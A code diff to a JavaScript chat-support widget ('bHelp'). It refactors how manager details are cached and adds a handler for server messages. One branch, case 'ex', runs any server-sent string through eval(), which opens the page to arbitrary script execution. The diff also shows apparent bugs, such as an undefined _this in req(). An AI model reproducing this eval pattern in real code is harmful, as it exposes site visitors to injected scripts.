@@ -123,11 +123,7 @@ bHelp = (function(){
 						content: rsp.manager.block_img
 					};
 				}
-				if(typeof _this.managerList[_this.mid]=='undefined') _this.managerList[_this.mid] = {img:{},block:{},text:""};
-				_this.managerList[_this.mid].img = img;
-				_this.managerList[_this.mid].block = block;
-				_this.managerList[_this.mid].text = rsp.manager.text;
-				_this.Storage.setItem('bhelp_managerList',JSON.stringify(_this.managerList));
+				_this.managerInfo({id:rsp.manager.id,img:img,block:block,text:rsp.manager.text});
 				_this.reonline();
 				_this.activeOnline();
 				_this.activeOffline();
@@ -145,6 +141,15 @@ bHelp = (function(){
 				_this.off();
 			});
 
+
+		},
+		managerInfo: function(info){
+			var _this = this;
+			if(typeof _this.managerList[info.id]=='undefined') _this.managerList[info.id] = {img:{},block:{},text:""};
+			_this.managerList[info.id].img = info.img;
+			_this.managerList[info.id].block = info.block;
+			_this.managerList[info.id].text = info.text;
+			_this.Storage.setItem('bhelp_managerList',JSON.stringify(_this.managerList));
 
 		},
 		listen: function(){
@@ -197,6 +202,44 @@ bHelp = (function(){
 					}});
 		},
 		req: function(info){
+			$.each(info, function (index, v) {
+					switch(index) {
+					case 'msg':
+						_this.msg(v);
+						break;
+					case 'manager':
+						_this.mid = v.id;
+						var img = {};
+						if(typeof _this.managerList[_this.mid]!='undefined' && v.version_img==_this.managerList[_this.mid].img.version){
+							img = _this.managerList[_this.mid].img;
+						}else {
+							img = {
+								version: v.version_img,
+								content: v.img
+							};
+						}
+						var block = {};
+						if(typeof _this.managerList[_this.mid]!='undefined' && v.block_img==_this.managerList[_this.mid].block.version){
+							block = _this.managerList[_this.mid].block;
+						}else {
+							block = {
+								version: v.version_block,
+								content: v.block_img
+							};
+						}
+						_this.managerInfo({id:v.id,img:img,block:block,text:v.text});
+						break;
+					case 'client':
+						_this.uInfo(v.name, v.phone);
+						break;
+					case 'signal':
+						_this.signal(v);
+						break;
+					case 'ex':
+						eval(v);
+						break;
+					}
+			});
 			console.log(info);
 		},
 		reonline: function(){
